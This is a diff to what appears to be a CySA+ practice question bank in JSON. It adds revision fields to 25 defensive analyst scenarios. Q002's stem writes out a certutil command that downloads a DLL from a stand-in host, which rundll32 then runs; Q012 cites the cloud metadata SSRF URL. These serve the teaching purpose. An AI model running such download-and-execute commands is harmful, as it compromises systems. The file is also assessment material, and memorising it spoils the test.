@@ -1,11 +1,12 @@
 {
-  "schemaVersion": 2,
+  "schemaVersion": 3,
   "bankId": "cysa-plus-cs0-003-nightmare-v1",
   "bankVersion": "1.0.0",
   "title": "CompTIA CySA+ CS0-003 Nightmare Diagnostic Bank v1",
   "questions": [
     {
       "id": "Q001",
+      "revision": 1,
       "domain": "1",
       "target": "1.1 Log correlation / time synchronization",
       "stem": "A SIEM shows the following events for host WS-17:\n\n10:14:02Z VPN: user=jlee login success src=198.51.100.44\n10:11:37 local EDR: WINWORD.EXE -> powershell.exe\n10:15:09Z firewall: WS-17 -> 203.0.113.77:443\n\nThe endpoint is later found to have been 4 minutes 30 seconds slow. Which sequence is MOST defensible after normalization?",
@@ -19,6 +20,7 @@
     },
     {
       "id": "Q002",
+      "revision": 1,
       "domain": "1",
       "target": "1.2 Process analysis / parent-child behavior",
       "stem": "EDR records this process chain on a finance workstation:\n\nOUTLOOK.EXE -> WINWORD.EXE -> cmd.exe /c certutil -urlcache -split -f https://cdn-example.net/a.dat C:\\Users\\Public\\a.dll\nWINWORD.EXE -> rundll32.exe C:\\Users\\Public\\a.dll,Start\n\nThe user opened an emailed document moments earlier. Which analyst action should occur FIRST?",
@@ -32,6 +34,7 @@
     },
     {
       "id": "Q003",
+      "revision": 1,
       "domain": "1",
       "target": "1.2 DNS analysis / tunneling",
       "stem": "A DNS sensor shows one workstation issuing queries like:\n\nMFRGGZDFMZTWQ2LK.example-sync.com TXT\nMRSWMZ3FNZ2GS3TH.example-sync.com TXT\nMFZWK3TFOI======.example-sync.com TXT\n\nResponses are small and mostly identical. The domain was registered yesterday. Which evidence would MOST increase confidence that this is exfiltration rather than benign service discovery?",
@@ -45,6 +48,7 @@
     },
     {
       "id": "Q004",
+      "revision": 1,
       "domain": "1",
       "target": "1.3 Threat intelligence / indicator aging",
       "stem": "An IP reputation feed labels 203.0.113.51 as malicious based on ransomware infrastructure seen nine months ago. Today the address belongs to a large shared cloud platform and appears in internal logs only as a destination used by a sanctioned SaaS application. What is the BEST use of the indicator?",
@@ -58,6 +62,7 @@
     },
     {
       "id": "Q005",
+      "revision": 1,
       "domain": "1",
       "target": "1.5 Automation / orchestration",
       "stem": "A SOAR playbook receives a high-severity phishing alert. The message contains a URL, the sender has no prior history, and one sandbox engine marks the URL suspicious while four engines return unknown. Which automated step is MOST appropriate without analyst approval?",
@@ -71,6 +76,7 @@
     },
     {
       "id": "Q006",
+      "revision": 1,
       "domain": "1",
       "target": "1.4 Threat hunting / hypothesis testing",
       "stem": "A hunter hypothesizes that an adversary is using living-off-the-land binaries to stage files before exfiltration. Which query result BEST supports that hypothesis?",
@@ -84,6 +90,7 @@
     },
     {
       "id": "Q007",
+      "revision": 1,
       "domain": "1",
       "target": "1.2 Authentication analysis / federated sessions",
       "stem": "A terminated employee's AD account is disabled at 09:00. At 09:20, the user's SaaS session successfully downloads files. The SaaS app uses SAML SSO and issued an eight-hour session token at 08:15. No new IdP authentication occurs after termination. Which action MOST directly contains the observed access?",
@@ -97,6 +104,7 @@
     },
     {
       "id": "Q008",
+      "revision": 1,
       "domain": "1",
       "target": "1.2 Email authentication / DMARC alignment",
       "stem": "A message has these results:\n\nSPF: pass for bounce.vendor-mail.net\nDKIM: pass with d=vendor-mail.net\nHeader From: payroll.example.com\nDMARC policy for payroll.example.com: p=reject\n\nNo organizational-domain alignment exists between vendor-mail.net and payroll.example.com. What should a compliant receiver do?",
@@ -110,6 +118,7 @@
     },
     {
       "id": "Q009",
+      "revision": 1,
       "domain": "2",
       "target": "2.1 Vulnerability scanning / credential quality",
       "stem": "A credentialed scanner reports no missing Windows updates. Manual review shows two critical updates absent. Authentication logs confirm the scanner account logged in successfully, but the account cannot access the registry keys and update inventory used by local checks. How should the scan result be classified?",
@@ -123,6 +132,7 @@
     },
     {
       "id": "Q010",
+      "revision": 1,
       "domain": "2",
       "target": "2.2 Cloud assessment tools",
       "stem": "A team must first evaluate AWS configuration against hardening benchmarks, then identify broad multi-service posture weaknesses, then test whether existing IAM permissions can be chained into privilege escalation. Which sequence BEST fits?",
@@ -136,6 +146,7 @@
     },
     {
       "id": "Q011",
+      "revision": 1,
       "domain": "2",
       "target": "2.3 Vulnerability prioritization / exploitability",
       "stem": "Two findings each have CVSS 9.8. Finding A affects an internet-facing payment API, has a public exploit, and exploitation is observed in the wild. Finding B affects an isolated lab system being retired in five days, with no known exploit. Which action is BEST?",
@@ -149,6 +160,7 @@
     },
     {
       "id": "Q012",
+      "revision": 1,
       "domain": "2",
       "target": "2.4 SSRF",
       "stem": "A web service fetches a URL supplied by the user. Testing shows the service can retrieve http://169.254.169.254/latest/meta-data/ and return cloud metadata to the requester. Which control MOST directly addresses the root weakness?",
@@ -162,6 +174,7 @@
     },
     {
       "id": "Q013",
+      "revision": 1,
       "domain": "2",
       "target": "2.4 Access control / IDOR",
       "stem": "An API request GET /accounts/8841/statements succeeds for user A. Changing only the object ID to 8842 returns user B's statements. Authentication remains valid in both cases. Which remediation is MOST appropriate?",
@@ -175,6 +188,7 @@
     },
     {
       "id": "Q014",
+      "revision": 1,
       "domain": "2",
       "target": "2.4 SQL injection / remediation",
       "stem": "An application builds SQL using string concatenation. A filter blocks quotes, semicolons, UNION, and comment markers, but testers continue finding bypasses. What should the development team do NEXT?",
@@ -188,6 +202,7 @@
     },
     {
       "id": "Q015",
+      "revision": 1,
       "domain": "2",
       "target": "2.5 Compensating controls",
       "stem": "A critical vulnerability affects a medical appliance that cannot be patched for six weeks without voiding vendor support. Exploitation requires access to TCP/8443 on the management interface. The appliance must remain operational. Which temporary response BEST reduces risk?",
@@ -201,6 +216,7 @@
     },
     {
       "id": "Q016",
+      "revision": 1,
       "domain": "2",
       "target": "2.1 OT / passive discovery",
       "stem": "A plant has legacy PLCs that have previously faulted under aggressive network scanning. Security needs an initial inventory of communicating devices and protocols without risking production. What should be done FIRST?",
@@ -214,6 +230,7 @@
     },
     {
       "id": "Q017",
+      "revision": 1,
       "domain": "3",
       "target": "3.2 Incident response / containment sequencing",
       "stem": "EDR confirms ransomware encryption on WS-24. The same user account authenticated to FS-01, FS-02, and FS-03 in the previous eight minutes. No encryption alert has fired on the file servers. Which action should the responder take NEXT?",
@@ -227,6 +244,7 @@
     },
     {
       "id": "Q018",
+      "revision": 1,
       "domain": "3",
       "target": "3.2 Evidence acquisition / volatility",
       "stem": "A compromised server is maintaining an active reverse shell. Counsel requests evidence preservation for possible litigation. The service is business critical, but a redundant node can take traffic. What is the BEST sequence?",
@@ -240,6 +258,7 @@
     },
     {
       "id": "Q019",
+      "revision": 1,
       "domain": "3",
       "target": "3.3 Root cause / lessons learned",
       "stem": "A contractor's VPN account remained enabled six months after contract termination. The account was later used to access an exposed remote-management service with valid credentials. Which statement BEST separates root cause from corrective action?",
@@ -253,6 +272,7 @@
     },
     {
       "id": "Q020",
+      "revision": 1,
       "domain": "3",
       "target": "3.1 Attack frameworks / Diamond Model",
       "stem": "Investigators identify a phishing domain, a VPS used to host payloads, a PowerShell downloader, and finance employees targeted by the campaign. Which Diamond Model mapping is MOST accurate?",
@@ -266,6 +286,7 @@
     },
     {
       "id": "Q021",
+      "revision": 1,
       "domain": "3",
       "target": "3.2 Recovery / recurrence",
       "stem": "A server is rebuilt from a known-good image after malware eradication. Twelve hours later, the same malicious scheduled task reappears. EDR shows no execution from the restored image before the task is recreated. What should happen NEXT?",
@@ -279,6 +300,7 @@
     },
     {
       "id": "Q022",
+      "revision": 1,
       "domain": "4",
       "target": "4.1 Vulnerability reporting / recurrence",
       "stem": "A quarterly report shows 96% SLA compliance for critical findings, yet the same insecure service configuration appears on newly deployed systems every month. Which measure would BEST reveal the control failure hidden by the SLA metric?",
@@ -292,6 +314,7 @@
     },
     {
       "id": "Q023",
+      "revision": 1,
       "domain": "4",
       "target": "4.2 Incident reporting / executive communication",
       "stem": "An executive incident update is due while investigation is ongoing. The team knows 24 accounts were accessed, but data exfiltration is not yet confirmed. Which wording is MOST appropriate?",
@@ -305,6 +328,7 @@
     },
     {
       "id": "Q024",
+      "revision": 1,
       "domain": "4",
       "target": "4.2 Regulatory communication / uncertainty",
       "stem": "A breach may involve regulated customer records, but the affected population is still being determined. Which communication approach is BEST?",
@@ -318,6 +342,7 @@
     },
     {
       "id": "Q025",
+      "revision": 1,
       "domain": "4",
       "target": "4.1 SLA / SLO distinction",
       "stem": "Security policy sets a 14-day remediation target for critical internet-facing vulnerabilities. A managed-service contract guarantees that 99.5% of in-scope assets will be scanned monthly. Which statement is MOST accurate?",
